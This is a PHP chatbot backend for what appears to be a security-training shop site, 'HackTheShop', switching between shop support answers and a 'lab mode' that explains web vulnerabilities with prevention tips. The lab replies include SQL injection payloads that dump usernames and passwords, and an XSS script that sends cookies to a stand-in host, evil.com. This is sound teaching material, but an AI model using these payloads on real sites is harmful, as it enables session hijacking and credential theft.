<?php
session_start();
header('Content-Type: application/json');

$message = strtolower(trim($_POST['message'] ?? ''));

if (!$message) {
  echo json_encode(["reply" => "💬 Please type a message first."]);
  exit;
}

if (!isset($_SESSION['mode'])) {
  $_SESSION['mode'] = 'general';
}
$mode = $_SESSION['mode'];

$securityWords = ['sql','sqli','xss','csrf','hack','hacker','security','attack','vulnerability',
                  'inject','cookie','session','password','bypass','exploit','login','admin','idor'];
$shopWords     = ['buy','price','product','cart','shop','shipping','delivery','order','refund',
                  'return','payment','stock','customer','discount','promo','coupon','track'];

$isSecurity = false;
$isShop     = false;

foreach ($securityWords as $w) { if (str_contains($message, $w)) { $isSecurity = true; break; } }
foreach ($shopWords     as $w) { if (str_contains($message, $w)) { $isShop     = true; break; } }

// Mode switching
if (str_contains($message, 'lab mode') || str_contains($message, 'security mode')) {
  $_SESSION['mode'] = 'security';
  echo json_encode(["reply" => "🔓 <b>Security Lab Mode Activated.</b><br><br>I can explain SQL Injection, XSS, IDOR, CSRF, sessions, cookies, and website vulnerabilities.<br><br>Type <b>reset</b> to go back to shop mode."]);
  exit;
}
if (str_contains($message, 'shop mode')) {
  $_SESSION['mode'] = 'shop';
  echo json_encode(["reply" => "🛒 <b>Shop Assistant Mode Activated.</b><br><br>Ask me about orders, shipping, products, refunds, or payments."]);
  exit;
}
if (str_contains($message, 'reset')) {
  $_SESSION['mode'] = 'general';
  echo json_encode(["reply" => "♻️ Chat mode reset. I can help with both shopping and security topics."]);
  exit;
}

if ($isSecurity) $_SESSION['mode'] = 'security';
if ($isShop)     $_SESSION['mode'] = 'shop';
$mode = $_SESSION['mode'];

$reply = "";

if (str_contains($message, 'hello') || str_contains($message, 'hi') || str_contains($message, 'hey')) {
  $reply = "👋 Hello! Welcome to <b style='color:#a78bfa;'>HackTheShop</b>.<br><br>"
         . "I can help with:<br>"
         . "🛒 Orders / Products / Shipping<br>"
         . "🔐 Website Security / SQLi / XSS<br><br>"
         . "Type <b>lab mode</b> to enter the hidden security learning mode.";

} elseif ($mode === 'security') {

  if (str_contains($message, 'sql') || str_contains($message, 'inject')) {
    $reply = "🔐 <b>SQL Injection (SQLi)</b><br><br>"
           . "Happens when user input is directly inserted into SQL queries without sanitization.<br><br>"
           . "<b>Classic payload:</b><br><code>' OR '1'='1' --</code><br><br>"
           . "<b>Union attack:</b><br><code>' UNION SELECT username,password FROM users --</code><br><br>"
           . "<b>Prevention:</b> Always use PDO prepared statements with bound parameters.";
  } elseif (str_contains($message, 'xss')) {
    $reply = "🔐 <b>XSS (Cross-Site Scripting)</b><br><br>"
           . "Injects malicious JavaScript into web pages viewed by other users.<br><br>"
           . "<b>Stored XSS:</b> Saved in DB, executes for every visitor.<br>"
           . "<b>Reflected XSS:</b> In URL params, executed immediately.<br><br>"
           . "<b>Example payload:</b><br><code>&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</code><br><br>"
           . "<b>Prevention:</b> Use <code>htmlspecialchars()</code> and Content-Security-Policy headers.";
  } elseif (str_contains($message, 'idor')) {
    $reply = "🔐 <b>IDOR (Insecure Direct Object Reference)</b><br><br>"
           . "Accessing resources by guessing object IDs without authorization.<br><br>"
           . "<b>Example:</b><br>Changing <code>/account?id=1337</code> to <code>/account?id=1</code> to view another user's data.<br><br>"
           . "<b>Prevention:</b> Always verify ownership server-side before returning data.";
  } elseif (str_contains($message, 'csrf')) {
    $reply = "🔐 <b>CSRF (Cross-Site Request Forgery)</b><br><br>"
           . "Tricks a logged-in user into making unwanted requests on a site.<br><br>"
           . "<b>Example:</b> An img tag that secretly triggers a bank transfer.<br><br>"
           . "<b>Prevention:</b> Use CSRF tokens in all forms and check the Referer header.";
  } elseif (str_contains($message, 'cookie') || str_contains($message, 'session')) {
    $reply = "🍪 <b>Cookie & Session Security</b><br><br>"
           . "• Set <code>HttpOnly</code> flag — prevents JS access<br>"
           . "• Set <code>Secure</code> flag — HTTPS only<br>"
           . "• Set <code>SameSite=Strict</code> — blocks CSRF<br>"
           . "• Call <code>session_regenerate_id(true)</code> after login<br>"
           . "• Expire sessions after inactivity (30 min recommended)";
  } elseif (str_contains($message, 'password')) {
    $reply = "🔑 <b>Password Security</b><br><br>"
           . "Always store passwords hashed:<br><code>password_hash(\$pw, PASSWORD_DEFAULT)</code><br><br>"
           . "Verify with:<br><code>password_verify(\$input, \$hash)</code><br><br>"
           . "• Never use MD5 or SHA1 for passwords<br>"
           . "• Implement rate limiting & account lockout<br>"
           . "• Enforce minimum 8 characters";
  } elseif (str_contains($message, 'hint') || str_contains($message, 'challenge')) {
    $reply = "🕵️ <b>Challenge Hints</b><br><br>"
           . "• PC challenge → think about SQL WHERE clauses<br>"
           . "• Phone challenge → look for reflected output<br>"
           . "• Gaming challenge → arrays and indices<br>"
           . "• Screens challenge → divide and conquer<br><br>"
           . "Type the vulnerability name for a full explanation!";
  } else {
    $reply = "🔓 <b>Security Lab Mode</b> active.<br><br>"
           . "Topics I can explain:<br>"
           . "• <b>SQL Injection</b> — type 'sql'<br>"
           . "• <b>XSS</b> — type 'xss'<br>"
           . "• <b>IDOR</b> — type 'idor'<br>"
           . "• <b>CSRF</b> — type 'csrf'<br>"
           . "• <b>Sessions & Cookies</b><br>"
           . "• <b>Password storage</b><br>"
           . "• <b>Challenge hints</b>";
  }

} elseif ($mode === 'shop') {

  if (str_contains($message, 'shipping') || str_contains($message, 'delivery')) {
    $reply = "📦 Standard shipping: <b>3–5 business days</b><br>Express: <b>1–2 business days</b> (+$15)";
  } elseif (str_contains($message, 'refund') || str_contains($message, 'return')) {
    $reply = "↩️ Returns accepted within <b>30 days</b> of delivery.<br>Item must be in original condition.";
  } elseif (str_contains($message, 'payment')) {
    $reply = "💳 We accept: Visa, Mastercard, PayPal, Apple Pay, and bank transfer.";
  } elseif (str_contains($message, 'track') || str_contains($message, 'order')) {
    $reply = "📍 To track your order, please provide your <b>order ID</b> and we'll look it up for you!";
  } elseif (str_contains($message, 'discount') || str_contains($message, 'promo') || str_contains($message, 'coupon')) {
    $reply = "🏷️ Use code <b>WELCOME10</b> for 10% off your first order!<br>Check the Promotions page for flash deals.";
  } elseif (str_contains($message, 'stock') || str_contains($message, 'available')) {
    $reply = "✅ Most products are in stock. If an item is unavailable, it will show as <b>Out of Stock</b> on the product page.";
  } else {
    $reply = "🛒 <b>Shop Assistant</b> ready.<br><br>"
           . "Ask me about:<br>"
           . "• Shipping & delivery<br>"
           . "• Returns & refunds<br>"
           . "• Payment methods<br>"
           . "• Order tracking<br>"
           . "• Discounts & promo codes";
  }

} else {
  $reply = "🤖 I'm your HackTheShop assistant.<br><br>"
         . "I can help with:<br>"
         . "🛒 Shopping support<br>"
         . "🔐 Website security topics<br><br>"
         . "Try asking anything, or type <b>lab mode</b> for security topics!";
}

echo json_encode(["reply" => $reply]);
?>